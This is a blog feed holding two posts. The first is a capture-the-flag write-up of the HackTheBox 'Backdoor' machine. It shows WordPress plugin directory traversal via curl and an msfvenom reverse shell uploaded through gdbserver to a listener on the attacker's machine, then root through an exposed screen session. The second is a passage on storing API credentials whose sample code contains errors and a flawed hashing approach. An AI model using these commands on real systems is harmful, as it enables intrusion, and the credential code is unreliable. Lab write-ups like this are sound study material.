@@ -1,0 +1,1355 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://abusinglinux.com//feed.xml" rel="self" type="application/atom+xml" /><link href="https://abusinglinux.com//" rel="alternate" type="text/html" /><updated>2022-09-07T18:58:52+00:00</updated><id>https://abusinglinux.com//feed.xml</id><title type="html">AbusingLinux</title><subtitle>Hi, Im Pedro García a cybersecurity and ethical hacking learner. I will be sharing on this web site all my knowledge of these particular arts. I hope you enjoy this blog as much as I do writting all this! &lt;3
+</subtitle><author><name>isuckatlinux</name></author><entry><title type="html">Backdoor HTB WriteUp</title><link href="https://abusinglinux.com//2022/09/07/backdoor-htb-writeup.html" rel="alternate" type="text/html" title="Backdoor HTB WriteUp" /><published>2022-09-07T00:00:00+00:00</published><updated>2022-09-07T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/09/07/backdoor-htb-writeup</id><content type="html" xml:base="https://abusinglinux.com//2022/09/07/backdoor-htb-writeup.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>This an easy linux machine, we can learn how to discover Wordpress plugins, search vulnerabilities on them. Also, we are going to be covering some screen missconfigurations.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>We are going to discover open ports:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-oG</span> ports 10.10.11.125
+</code></pre></div></div>
+
+<p>We are going to extract the open ports with the getPorts utility.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getPorts <span class="nt">-f</span> ports
+</code></pre></div></div>
+
+<p>The open ports that we discovered are:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22,80,1337
+</code></pre></div></div>
+
+<p>Now we are going to scan the services on this ports:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-p22</span>,80,1337 <span class="nt">--min-rate</span> 5000 <span class="nt">-oN</span> services 10.10.11.125
+</code></pre></div></div>
+<p>We have three services running on the machine:</p>
+<ol>
+  <li>Port 22: “OpenSSH 8.2p1”</li>
+  <li>Port 80: “Apache httpd 2.4.41”</li>
+  <li>Port 1337: “waste?”</li>
+</ol>
+
+<p>Waste services is a bit strange. We are going to look forward that.</p>
+
+<h3 id="port-1337">Port 1337</h3>
+
+<p>In this <a href="https://www.speedguide.net/port.php?port=1337">link</a> we can find common services in the 1337 port.</p>
+
+<p>We can try to grab the banner of the service:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.10.11.125:1337
+</code></pre></div></div>
+<p>We don’t get much…</p>
+
+<p>Also we can try connect with netcat:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.11.125 1337
+</code></pre></div></div>
+<p>We don’t recieve any response neither…</p>
+
+<h3 id="web">Web</h3>
+<p>If we slightly inspect the web we can found that has been created with WordPress.</p>
+
+<p>We can try to get more info about the web:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatwhatweb 10.10.11.125 
+</code></pre></div></div>
+
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &amp;#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
+</code></pre></div></div>
+
+<p>We can see that is using 5.8.1 WordPress version.</p>
+
+<h3 id="wordpress-enumeration">Wordpress enumeration</h3>
+
+<h4 id="wpscan">wpscan</h4>
+<p>We can leave WordPress detecting and scanning themes, plugins and wordpress vulnerabilities.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.11.125 <span class="nt">-o</span> wpevidence <span class="nt">-v</span> <span class="nt">--plugins-detection</span> aggressive <span class="nt">--enumerate</span> vp,vt
+</code></pre></div></div>
+<p>Meanwhile wpscann is running we are going to proceed to enumerate the Wordpress manually.</p>
+
+<h4 id="searchsploit">Searchsploit</h4>
+<p>We will search for common Wordpress 5.8.1 vulnerabities.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="s2">"wordpress 5.8.1"</span>
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulne
+
+WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection
+
+WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injecti
+</code></pre></div></div>
+<p>If these plugins are used on the sit probably probably we had an entry point.</p>
+
+<h4 id="google-search">Google search</h4>
+<p>We are going to keep searching for Wordpress 5.8.1 vulnerabities.
+At this <a href="https://wpscan.com/wordpress/581">link</a> we can get some vulnerabilities that we can explore later.</p>
+
+<h4 id="manual-wordpress-enumeration">Manual WordPress enumeration</h4>
+<p>Following this <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress">HackTricks guide</a> we are going to enumerate all the website manually.</p>
+
+<ul>
+  <li>
+    <p>We can found a login at <em>wp-login.php</em></p>
+  </li>
+  <li>
+    <p><em>wp-content</em> Folder seems to return nothing, but <em>wp-content/uploads/</em> return us all the files.</p>
+  </li>
+</ul>
+
+<p>Since we can’t see all the stuff that <em>wp-content</em> show us we will search for the common directories inside it.
+These are:</p>
+<ol>
+  <li>themes</li>
+  <li>plugins</li>
+  <li>uploads</li>
+  <li>index.php</li>
+</ol>
+
+<p>As we try some paths we discover some directories we found that  <em>wp-content/plugins</em> exist and we found one plugin called “ebook-download”.</p>
+
+<p>We can search for Wordpress eBook plugin vulnerabilities.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="s2">"wordpress ebook"</span>
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WordPress Plugin eBook Download 1.1 - Directory Traversal
+.
+.
+.
+</code></pre></div></div>
+<p>We had found that the 1.1 ebook version is vulnerable to a Directory Traversal attack.</p>
+
+<p>At <em>/wp-content/plugins/ebook-download/readme.txt</em> we see the line “Stable tag: 1.1”. We can assume that our plugin is running 1.1 version.</p>
+
+<p>We mirror the exploit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> 39575
+</code></pre></div></div>
+
+<p>If we inspect the file we can find the PoC:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+</code></pre></div></div>
+
+<p>If we try to run with curl the PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span class="o">=</span>../../../wp-config.php
+</code></pre></div></div>
+<p>We got a response!
+Now we got a Directory Traversal explotable vulnerability.</p>
+
+<h3 id="automatizing-directory-transversal">Automatizing Directory Transversal</h3>
+
+<p>We created a <a href="https://github.com/isuckatlinux/htbmachines/blob/main/backdoor/exploits/dt.sh">bash script</a> to dowload and show all the files we want.
+We can list users:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./dt /etc/passwd
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre></div></div>
+
+<p>We can see that a user called user is allocated in the system. We can try to grab the flag.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./dt /home/user/user.txt
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>-] File /home/user/user.txt not found at 10.10.11.125
+</code></pre></div></div>
+<p>We dont get much…</p>
+
+<p>We are going to create a <a href="https://github.com/isuckatlinux/htbmachines/blob/main/backdoor/exploits/list_process.sh">script</a> to list all the process running at the machine using the script we just created.<br />
+We run it: <br />
+<em>Note: The dt.sh and the list_process.sh script have to be in the same directory</em></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./list_process.sh 2&gt;/dev/null
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* Process 1:
+         CMD: /sbin/initautoautomatic-ubiquitynoprompt
+* Process 487:
+         CMD: /lib/systemd/systemd-journald
+* Process 515:
+         CMD: /lib/systemd/systemd-udevd
+* Process 538:
+         CMD: /lib/systemd/systemd-networkd
+* Process 658:
+         CMD: /sbin/multipathd-d-s
+* Process 659:
+         CMD: /sbin/multipathd-d-s
+* Process 660:
+         CMD: /sbin/multipathd-d-s
+* Process 661:
+         CMD: /sbin/multipathd-d-s
+* Process 662:
+         CMD: /sbin/multipathd-d-s
+* Process 663:
+         CMD: /sbin/multipathd-d-s
+* Process 664:
+         CMD: /sbin/multipathd-d-s
+* Process 684:
+         CMD: /lib/systemd/systemd-resolved
+* Process 686:
+         CMD: /lib/systemd/systemd-timesyncd
+* Process 709:
+         CMD: /usr/bin/VGAuthService
+* Process 711:
+         CMD: /usr/bin/vmtoolsd
+* Process 753:
+         CMD: /usr/bin/vmtoolsd
+* Process 754:
+         CMD: /usr/bin/vmtoolsd
+* Process 756:
+         CMD: /usr/bin/vmtoolsd
+* Process 772:
+         CMD: /lib/systemd/systemd-timesyncd
+* Process 789:
+         CMD: /usr/lib/accountsservice/accounts-daemon
+* Process 790:
+         CMD: /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only
+* Process 792:
+         CMD: /usr/lib/accountsservice/accounts-daemon
+* Process 797:
+         CMD: /usr/sbin/irqbalance--foreground
+* Process 798:
+         CMD: /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers
+* Process 801:
+         CMD: /usr/sbin/irqbalance--foreground
+* Process 802:
+         CMD: /usr/sbin/rsyslogd-n-iNONE
+* Process 803:
+         CMD: /lib/systemd/systemd-logind
+* Process 805:
+         CMD: /usr/sbin/rsyslogd-n-iNONE
+* Process 806:
+         CMD: /usr/sbin/rsyslogd-n-iNONE
+* Process 807:
+         CMD: /usr/sbin/rsyslogd-n-iNONE
+* Process 827:
+         CMD: /usr/sbin/cron-f
+* Process 829:
+         CMD: /usr/sbin/CRON-f
+* Process 830:
+         CMD: /usr/sbin/CRON-f
+* Process 851:
+         CMD: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
+* Process 859:
+         CMD: /usr/sbin/atd-f
+* Process 860:
+         CMD: /bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
+* Process 861:
+         CMD: suuser-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
+* Process 868:
+         CMD: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+* Process 878:
+         CMD: /usr/sbin/apache2-kstart
+* Process 933:
+         CMD: /usr/lib/accountsservice/accounts-daemon
+* Process 937:
+         CMD: /sbin/agetty-o-p -- \u--nocleartty1linux
+* Process 950:
+         CMD: SCREEN-dmSroot
+* Process 955:
+         CMD: -/bin/bash
+* Process 960:
+         CMD: /usr/lib/policykit-1/polkitd--no-debug
+* Process 968:
+         CMD: /lib/systemd/systemd--user
+* Process 969:
+         CMD: /usr/lib/policykit-1/polkitd--no-debug
+* Process 973:
+         CMD: /usr/lib/policykit-1/polkitd--no-debug
+* Process 974:
+         CMD: /usr/sbin/mysqld
+* Process 975:
+         CMD: (sd-pam)
+* Process 990:
+         CMD: /usr/sbin/apache2-kstart
+* Process 991:
+         CMD: /usr/sbin/apache2-kstart
+* Process 993:
+         CMD: /usr/sbin/apache2-kstart
+* Process 994:
+         CMD: bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
+* Process 995:
+         CMD: gdbserver--once0.0.0.0:1337/bin/true
+* Process 999:
+         CMD: /bin/true
+* Process 1000:
+         CMD: /usr/sbin/apache2-kstart
+</code></pre></div></div>
+
+<p>We can see a bunch of process in the machine.
+We can notice the a gbd server is running on the 1337 port.</p>
+
+<p>We can google search about this process. In this <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver">HackTricks Post</a> they explain us how to pentest and exploit this service.</p>
+
+<h3 id="gaining-user-access">Gaining User Access</h3>
+
+<p>First we are going to set up a reverse shell at 4444:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<p>Second, we are going to follow the steps posted in the <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver">guide</a>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Trick shared by @B1n4rySh4d0w</span>
+msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$TUN0_IP</span> <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">PrependFork</span><span class="o">=</span><span class="nb">true</span> <span class="nt">-f</span> elf <span class="nt">-o</span> binary.elf
+
+<span class="nb">chmod</span> +x binary.elf
+
+gdb binary.elf
+
+<span class="c"># Set remote debuger target</span>
+target extended-remote <span class="nv">$MACHINE_IP</span>:1337
+
+<span class="c"># Upload elf file</span>
+remote put binary.elf binary.elf
+
+<span class="c"># Set remote executable file</span>
+<span class="nb">set </span>remote exec-file /home/user/binary.elf
+
+<span class="c"># Execute reverse shell executable</span>
+run
+
+<span class="c"># You should get your reverse-shell</span>
+</code></pre></div></div>
+<p>POUM!<br />
+Now we got a shell as <em>user</em>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
+</span>user
+</code></pre></div></div>
+
+<p>We can capture the user flag.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd
+cat </span>user.txt
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<h4 id="upgrading-the-shell">Upgrading the shell</h4>
+<p>We can upgrade the shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<h4 id="identifiying-screen-missconfiguration">Identifiying screen missconfiguration</h4>
+<p>In the process that we list above, we also can see a <a href="https://linux.die.net/man/1/screen">screen</a> process.</p>
+
+<p>A screen can be attached if multi-user is enabled.</p>
+
+<p>To list the screen a user is running, just run the command</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>screen <span class="nt">-ls</span> <span class="nv">$USER</span>/
+</code></pre></div></div>
+
+<p>If we try this for root:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>screen <span class="nt">-ls</span> root/
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>There is a suitable screen on:
+        952.root        (09/07/22 17:31:21)     (Multi, detached)
+1 Socket in /run/screen/S-root.
+</code></pre></div></div>
+
+<p>We can see that root user is running a screen called root and it’s suitable for us.
+We can attatch to it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>screen <span class="nt">-r</span> root/root
+</code></pre></div></div>
+<p>POUM!💣
+Now we are inside root user and we can capture the flag.</p>
+
+<p>Thank’s all for reading!📙</p>]]></content><author><name>isuckatlinux</name></author><category term="hackthebox" /><category term="screen" /><category term="wordpress" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">Storing API credentials on Python</title><link href="https://abusinglinux.com//2022/07/07/storing-api-credentials-in-Python.html" rel="alternate" type="text/html" title="Storing API credentials on Python" /><published>2022-07-07T00:00:00+00:00</published><updated>2022-07-07T00:00:00+00:00</updated><id>https://abusinglinux.com//2022/07/07/storing-api-credentials-in-Python</id><content type="html" xml:base="https://abusinglinux.com//2022/07/07/storing-api-credentials-in-Python.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>As we work with APIs we need to use some credentials to interact with them. These credentials can be stored in a safe way or not.
+In this post we are going to cover the most popular practices to handle sensitive credentials from worst to best.</p>
+
+<h2 id="bad-practices">Bad practices</h2>
+
+<ul>
+  <li>Harcoding credentials: 
+  By far the worst practice anyone can use trying to interact with an API.
+  If an attacker can somehow read the Python code file, he could get the credentials to read, write or delete sensitive data.
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">password</span> <span class="o">=</span> <span class="s">"non_super_secret_password"</span>
+  <span class="c1"># Using the password in the API...
+</span></code></pre></div>    </div>
+  </li>
+  <li>Encoding credentials: 
+  The only reason this practice is not qualificated as the  most <strong>devilish</strong> is because <em>harcoding credentials</em> exists.
+  Encoding credentials does not secure them at all. This is a way to transform a string into another format, and it happens to be extremely easy to figure out what format has been used to encode and then decode it back to the plain text string.
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">base64</span>
+  <span class="n">password</span> <span class="o">=</span> <span class="s">"bm9uX3N1cGVyX3NlY3JldF9wYXNzd29yZA=="</span>
+  <span class="n">uncoded_pass_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+  <span class="n">uncoded_pass</span> <span class="o">=</span> <span class="n">uncoded_pass_bytes</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
+  <span class="c1"># Using the uncoded_pass in the API...
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="good-practices">Good practices</h2>
+
+<ul>
+  <li>
+    <p>Storing credentiales in plain text files: 
+  A better aproach for storing API credentials is creating a file with the user and password you need. If we are using git to develop your software the credential file name must be added to the <em>.gitignore</em> file. By doing this you will keep your credentials in a safer way. Keep in mind that this kind of workflow doesn’t stop our credentials to be compromised if we get hacked.
+  In resume, this is a better way to work but not the safest at all.</p>
+  </li>
+  <li>
+    <p>Asking for the credentials in every execution: 
+  This is a really safe way to manage credentials. With the <em>getpass</em> python library we can get the credentials and save them into variables.
+  As you can guess this practice is as secure as inefficient. We would have to input the user and password every time which could be very tedious and unproductive.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">getpass</span>
+  <span class="c1"># If you want to hide the username also
+</span>  <span class="n">user</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getpass</span><span class="p">(</span><span class="s">'Username: '</span><span class="p">)</span> 
+
+  <span class="n">password</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getpass</span><span class="p">(</span><span class="s">'Password: '</span><span class="p">)</span>
+
+  <span class="c1"># Using your credentials...
+</span></code></pre></div>    </div>
+  </li>
+  <li>Storing creds as enviroment variables.
+  Another way to manage credentials is to store them but as enviroment variables.
+  Depending on the OS used we will have to work with one of the following methods:
+    <ul>
+      <li>On Linux: Add to the <em>~/.bashrc</em> file the line:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">export </span><span class="nv">API_PASSWORD</span><span class="o">=</span><span class="s2">"supersecretpass"</span>
+</code></pre></div>        </div>
+      </li>
+      <li>On Windows: Follow this <a href="https://docs.oracle.com/en/database/oracle/machine-learning/oml4r/1.5.1/oread/creating-and-modifying-environment-variables-on-windows.html#GUID-DD6F9982-60D5-48F6-8270-A27EC53807D0">link</a></li>
+    </ul>
+
+    <p>In order to store the password into a variable we only have to run:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">os</span>
+  <span class="n">password</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'API_PASSWORD'</span><span class="p">)</span>
+</code></pre></div>    </div>
+    <p>The drawback of this method is that we will mess up your OS enviroment with variables that you are going to use only in a specifyc application/software.</p>
+  </li>
+  <li>Storing credentials in <strong>.env</strong> file:
+  This method is similar to <em>Storing credentiales in plain text files</em>. We need to create an <strong>.env</strong> file with the creds:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">echo</span> <span class="s2">"API_PASSWORD=super_secret_password"</span> <span class="o">&gt;</span> environment.env
+</code></pre></div>    </div>
+    <p>To recover the password:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">dotenv</span>
+  <span class="kn">import</span> <span class="nn">os</span>
+
+  <span class="n">dotenv</span><span class="p">.</span><span class="n">load_dotenv</span><span class="p">(</span><span class="s">'environment.env'</span><span class="p">)</span>
+  <span class="n">api_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'API_PASSWORD'</span><span class="p">)</span>
+  <span class="c1"># Use your api password...
+</span></code></pre></div>    </div>
+    <p>This solves the problematic of messing up your OS enviroment, but it still isn’t the cleanest way.</p>
+  </li>
+  <li>
+    <p>Using Keyring: 
+  There is a Python library called <em>Keyring</em> that allows to store credentials under the home directory. These variables will also be encrypted with the current user’s password. Depending on the OS, keyring will use specifyc system’s keyring software.<br /></p>
+
+    <p><em>If we want to store our api user and password:</em></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">keyring</span>
+  <span class="n">keyring</span><span class="p">.</span><span class="n">set_password</span><span class="p">(</span><span class="s">'MY_API_NAME'</span><span class="p">,</span> <span class="s">'user'</span><span class="p">,</span> <span class="s">'super_secret_user'</span><span class="p">)</span>
+  <span class="n">keyring</span><span class="p">.</span><span class="n">set_password</span><span class="p">(</span><span class="s">'MY_API_NAME'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">,</span><span class="s">'super_secret_password'</span><span class="p">)</span>
+</code></pre></div>    </div>
+    <p>To recover the credentials:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">user</span> <span class="o">=</span> <span class="n">keyring</span><span class="p">.</span><span class="n">get_credential</span><span class="p">(</span><span class="s">'MY_API_NAME'</span><span class="p">,</span> <span class="s">'user'</span><span class="p">)</span>
+  <span class="n">password</span> <span class="o">=</span> <span class="n">keyring</span><span class="p">.</span><span class="n">get_credential</span><span class="p">(</span><span class="s">'MY_API_NAME'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="ideal-practices">Ideal practices</h2>
+
+<p>Notice that in the ‘good practices’ section we covered different ways to store credentials out of the code, but either there weren’t encrypted or the encryption relied on the current user’s password. This causes a problematic. <strong>One point of failure</strong>.<br />
+If someone can get our user and password he will also get our API credentials. If we need to ensure that our API data is protected even if we got hacked we must encrypt our credentials using a key that hasn’t been used before.</p>
+
+<ul>
+  <li>Hashing credentials: 
+  Hashing is a simple way to secure the credentials.
+  Keep in mind that we can’t hash-back the credentials so we will have to generate a hashed credentials file and then ask for them every execution, hashing them and compare to the file’s ones.
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">from</span> <span class="nn">passlib.hash</span> <span class="kn">import</span> <span class="n">bcrypt</span>
+  <span class="kn">from</span> <span class="nn">getpass</span> <span class="kn">import</span> <span class="n">getpass</span>
+
+  <span class="k">def</span> <span class="nf">generate_creds</span><span class="p">():</span>
+      <span class="n">plain_text</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getpass</span><span class="p">(</span><span class="s">'Plain text: '</span><span class="p">)</span>
+      <span class="n">hasher</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="p">.</span><span class="n">using</span><span class="p">(</span><span class="n">rounds</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+      <span class="n">hashed_text</span> <span class="o">=</span> <span class="n">hasher</span><span class="p">.</span><span class="nb">hash</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+      <span class="c1"># Write the hashed text in a file...
+</span>
+  <span class="k">def</span> <span class="nf">read_creds</span><span class="p">():</span>
+      <span class="n">hashed_text</span> <span class="o">=</span> <span class="n">readfile</span><span class="p">()</span> <span class="c1"># Store the previously hashed creds in a variable
+</span>      <span class="n">plain_text</span> <span class="o">=</span> <span class="n">getpass</span><span class="p">.</span><span class="n">getpass</span><span class="p">(</span><span class="s">'Plain text: '</span><span class="p">)</span>
+      <span class="n">hasher</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="p">.</span><span class="n">using</span><span class="p">(</span><span class="n">rounds</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">hasher</span><span class="p">.</span><span class="n">verify</span><span class="p">(</span><span class="n">plain_text</span><span class="p">,</span> <span class="n">hashed_text</span><span class="p">)</span>
+</code></pre></div>    </div>
+    <p>This has the same problem we faced before at <em>Ask for the credentials every execution</em>, this will make the workflow slower.</p>
+  </li>
+  <li>
+    <p>Symmetrical encryption:
+  In my opinion, symmetrical encryption is a really powerful way to secure the password and doesn’t waste a single bit of productivity (like in <em>hashing credentials</em>).
+  The drawback of this method is that is by far the most complex to implement and the one who requires the most crypto-algorithm-knowledge.
+  We will be using AES-256 CBC, a very well known symmetrical algorithm.</p>
+
+    <p>I could be talking about this algorithm for hours but I am going to jump right to the python implementation and in later posts we will be covering this algorithm thoroughly. <br /></p>
+
+    <p>Notice that in order to use custom length-key we have to derive it to 16-bit length.<br /></p>
+
+    <p>The common import section that we are going to use is:</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+  <span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span><span class="n">unpad</span>
+  <span class="kn">from</span> <span class="nn">Crypto.Protocol.KDF</span> <span class="kn">import</span> <span class="n">PBKDF2</span>
+  <span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA512</span>
+  <span class="kn">from</span> <span class="nn">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
